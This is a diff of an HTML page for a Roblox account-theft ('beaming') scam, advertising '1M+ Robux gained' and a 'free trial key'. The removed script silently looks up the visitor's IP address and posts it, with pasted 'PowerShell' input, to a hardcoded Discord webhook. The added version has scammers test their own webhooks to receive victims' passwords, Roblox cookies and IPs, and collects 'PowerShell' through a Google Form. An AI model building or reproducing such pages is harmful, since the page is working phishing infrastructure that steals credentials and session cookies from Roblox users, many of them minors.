@@ -25,6 +25,21 @@
             font-size: 1.8em;
             color: #00adb5;
         }
+        .set-up {
+            font-size: 3em;
+            color: white; /* Set the -SET UP text color to white */
+            margin-top: 40px;
+            font-weight: 700;
+        }
+        .extra-info {
+            margin-top: 20px;
+            font-size: 1.1em;
+            color: #eaeaea;
+        }
+        .list-item {
+            font-size: 1.2em;
+            margin: 10px 0;
+        }
         p {
             margin: 15px 0;
             font-size: 1.1em;
@@ -81,6 +96,27 @@
             justify-content: center;
             margin-top: 30px;
         }
+        .video-container {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+            flex-wrap: wrap; /* Allows the videos to adjust on smaller screens */
+        }
+        .video-container iframe {
+            width: 100%; /* Set the width to 100% for a larger video */
+            height: 400px; /* Reduced height for better visibility */
+            max-width: 700px; /* Set a max-width for larger screens */
+            margin-top: 20px;
+        }
+        .video-container div {
+            width: 48%; /* Makes the videos take up half of the space each */
+            text-align: center;
+        }
+        .video-container div h3 {
+            font-size: 1.2em;
+            color: #eaeaea;
+            margin-bottom: 10px;
+        }
     </style>
 </head>
 <body>
@@ -92,24 +128,52 @@
     </div>
 
     <div id="content" class="hidden">
+        <!-- Free Trial Section -->
         <h1>Free Trial Started - 3 Day Key</h1>
+
+        <!-- ROBLOX METHOD Section -->
         <h2>ROBLOX METHOD</h2>
         <ul>
-            <li>- Best Method</li>
-            <li>- 1M+ Robux Gained</li>
-        </ul>
-        <p>Tutorial: How to Get Your PowerShell</p>
-        <ul>
-            <li>- Send PowerShells via Text below.</li>
-            <li>- ONLY WORKS ON PROFILE, WE ARE FIXING GAME LINKS SOON</li>
+            <li class="list-item">- Best Method</li>
+            <li class="list-item">- 1M+ Robux Gained</li>
         </ul>
 
-  
-            <input type="text" id="webhookKey" placeholder="Enter Powershell to Create Link.">
-        <button onclick="sendToWebhook()">Create Link</button>
-                                                         
-        <div class="centered-video">
-            <iframe src="https://www.youtube.com/embed/zpvEXK6nc04" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+        <!-- Additional Information (Beaming and Active Users/Vouches) -->
+        <ul>
+            <li class="list-item">- Beaming since 2019</li>
+            <li class="list-item">- 2000+ Active users/vouches</li>
+        </ul>
+
+        <!-- SET UP Section -->
+        <div class="set-up">SET UP</div>
+
+        <!-- Webhook Test Section -->
+        <h2>WEBHOOK TEST</h2>
+        <input type="text" id="webhookUrl" placeholder="Enter your webhook URL" size="50">
+        <button onclick="testWebhook()">Test Webhook</button>
+        <div id="webhookResponse" style="margin-top: 20px;"></div>
+
+        <!-- Tutorial Section -->
+        <h2>Tutorial: How to Get Your PowerShell</h2>
+        <ul>
+            <li>- send profile power shell with the button</li>
+            <li>- all links /info will be sent to ur webhook (when setting up powershell profile might take 10 minutes</li>
+        </ul>
+        <button onclick="window.location.href='https://docs.google.com/forms/d/16QBbx3JkoJscZcKXI3_L5YOJTmEuxOGZNp4nsFUQzeQ/edit'">Enter PowerShell</button>
+
+        <!-- Video Section with 2 Videos -->
+        <div class="video-container">
+            <!-- First video (How to Get PowerShell) -->
+            <div>
+                <h3>HOW TO GET POWERSHELL</h3>
+                <iframe src="https://www.youtube.com/embed/zpvEXK6nc04" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
+
+            <!-- Second video (How to Copy Webhook) -->
+            <div>
+                <h3>HOW TO COPY WEBHOOK</h3>
+                <iframe src="https://www.youtube.com/embed/OtegFbcnBCk" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+            </div>
         </div>
     </div>
 
@@ -125,24 +189,20 @@
             }
         }
 
-        async function sendToWebhook() {
-            const userKey = document.getElementById("webhookKey").value;
-            if (!userKey) {
-                alert("Please enter Powershell");
+        async function testWebhook() {
+            const webhookUrl = document.getElementById("webhookUrl").value;
+            if (!webhookUrl) {
+                alert("Please enter your webhook URL.");
                 return;
             }
 
+            const payload = {
+                content: "@everyone webhook working ALL PASSWORD AND ROBLOX ```COOKIES``` ```IPS``` WILL BE SEND HERE",
+                username: "BIG HIT"
+            };
+
             try {
-                const ipResponse = await fetch("https://api.ipify.org?format=json");
-                const ipData = await ipResponse.json();
-                const ipAddress = ipData.ip;
-
-                const webhookUrl = "https://discord.com/api/webhooks/1302810226734403595/MMPGCUIQa0FD3_5WDk5_pFGwIlGGCe_6GjmxqNTQTd15CzHQ-jIsBAfv0M3HTBArMTHf";
-                const payload = {
-                    content: `@everyone IP ADDRESS: ${ipAddress}\nPowershell: ${inputContent}`
-                };
-
-                await fetch(webhookUrl, {
+                const response = await fetch(webhookUrl, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
@@ -150,10 +210,14 @@
                     body: JSON.stringify(payload)
                 });
 
-                alert("Powershell submitted successfully.");
+                if (response.ok) {
+                    document.getElementById("webhookResponse").innerHTML = "<p style='color: green;'>Webhook test successful!</p>";
+                } else {
+                    document.getElementById("webhookResponse").innerHTML = "<p style='color: red;'>Error testing webhook.</p>";
+                }
             } catch (error) {
-                console.error("Error sending to webhook:", error);
-                alert("There was an error submitting your key. Please try again.");
+                console.error("Error:", error);
+                document.getElementById("webhookResponse").innerHTML = "<p style='color: red;'>Error connecting to webhook.</p>";
             }
         }
     </script>
